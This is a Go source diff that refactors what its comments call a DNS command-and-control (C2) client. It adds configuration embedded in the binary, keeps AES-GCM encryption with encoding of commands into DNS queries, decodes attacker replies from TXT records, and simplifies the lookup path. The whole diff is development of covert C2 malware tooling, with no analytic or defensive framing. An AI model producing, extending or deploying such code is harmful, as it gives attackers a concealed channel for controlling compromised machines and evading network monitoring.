@@ -13,20 +13,19 @@ type DNSClient struct {
 	aesKey []byte
 }
 
-// NewDNSClient creates a new DNS C2 client
-func NewDNSClient(config *Config) *DNSClient {
-	// Generate AES key from encryption key in config
+// newDNSClient creates a new DNS C2 client with embedded config
+func newDNSClient() *DNSClient {
+	config := getConfig()
 	aesKey := generateAESKey(config.EncryptionKey)
 
 	return &DNSClient{
-		config: config,
+		config: &config,
 		aesKey: aesKey,
 	}
 }
 
 // encodeCommand encrypts and encodes a command string for DNS transmission
 func (c *DNSClient) encodeCommand(command string) (string, error) {
-	// Use AES-GCM encryption + base36 encoding
 	encoded, err := encryptAndEncode(command, c.aesKey)
 	if err != nil {
 		return "", fmt.Errorf("failed to encrypt and encode command: %v", err)
@@ -36,7 +35,6 @@ func (c *DNSClient) encodeCommand(command string) (string, error) {
 
 // decodeResponse decodes and decrypts a DNS response back to readable format
 func (c *DNSClient) decodeResponse(encoded string) (string, error) {
-	// Use base36 decoding + AES-GCM decryption
 	decoded, err := decodeAndDecrypt(encoded, c.aesKey)
 	if err != nil {
 		return "", fmt.Errorf("failed to decode and decrypt response: %v", err)
@@ -72,82 +70,36 @@ func (c *DNSClient) sendDNSQuery(command string) (string, error) {
 
 	var result string
 
-	// Determine query type
-	var qtype uint16
-	switch c.config.QueryType {
-	case "A":
-		qtype = 1
-	case "TXT":
-		qtype = 16
-	case "AAAA":
-		qtype = 28
-	default:
-		qtype = 1
-	}
-
+	// Use standard library DNS resolution only (simplified)
 	for attempt := 0; attempt < c.config.RetryAttempts; attempt++ {
-		// Use raw DNS if custom server specified, otherwise use standard library
-		if c.config.DNSServer != "" {
-			// Use raw DNS query to specific server
-			results, rawErr := c.sendRawDNSQuery(queryName, qtype, c.config.DNSServer)
-			if rawErr == nil && len(results) > 0 {
-				if c.config.QueryType == "TXT" {
-					// Try to decode TXT records
-					for _, txt := range results {
-						decoded, decErr := c.decodeResponse(txt)
-						if decErr == nil {
-							result = decoded
-						} else {
-							result = fmt.Sprintf("Raw TXT: %s", txt)
-						}
-						break
+		var err error
+		switch c.config.QueryType {
+		case "TXT":
+			txtRecords, lookupErr := net.LookupTXT(queryName)
+			if lookupErr == nil && len(txtRecords) > 0 {
+				// Try to decode TXT records
+				for _, txt := range txtRecords {
+					decoded, decErr := c.decodeResponse(txt)
+					if decErr == nil {
+						result = decoded
+					} else {
+						result = fmt.Sprintf("Raw TXT: %s", txt)
 					}
-				} else {
-					result = fmt.Sprintf("DNS Response: %v", results)
+					break
 				}
 				err = nil
 				break
 			}
-			err = rawErr
-		} else {
-			// Use standard library DNS resolution
-			switch c.config.QueryType {
-			case "A":
-				addrs, lookupErr := net.LookupHost(queryName)
-				if lookupErr == nil && len(addrs) > 0 {
-					result = fmt.Sprintf("DNS Response IPs: %v", addrs)
-					err = nil
-					break
-				}
-				err = lookupErr
+			err = lookupErr
 
-			case "TXT":
-				txtRecords, lookupErr := net.LookupTXT(queryName)
-				if lookupErr == nil && len(txtRecords) > 0 {
-					// Try to decode TXT records
-					for _, txt := range txtRecords {
-						decoded, decErr := c.decodeResponse(txt)
-						if decErr == nil {
-							result = decoded
-						} else {
-							result = fmt.Sprintf("Raw TXT: %s", txt)
-						}
-						break
-					}
-					err = nil
-					break
-				}
-				err = lookupErr
-
-			default:
-				addrs, lookupErr := net.LookupHost(queryName)
-				if lookupErr == nil && len(addrs) > 0 {
-					result = fmt.Sprintf("DNS Response IPs: %v", addrs)
-					err = nil
-					break
-				}
-				err = lookupErr
+		default:
+			addrs, lookupErr := net.LookupHost(queryName)
+			if lookupErr == nil && len(addrs) > 0 {
+				result = fmt.Sprintf("DNS Response IPs: %v", addrs)
+				err = nil
+				break
 			}
+			err = lookupErr
 		}
 
 		if err == nil {
@@ -164,7 +116,9 @@ func (c *DNSClient) sendDNSQuery(command string) (string, error) {
 	}
 
 	return result, nil
-} // sendCommand is the main interface for sending commands
+}
+
+// sendCommand is the main interface for sending commands
 func (c *DNSClient) sendCommand(command string) (string, error) {
 	if strings.TrimSpace(command) == "" {
 		return "", fmt.Errorf("empty command")
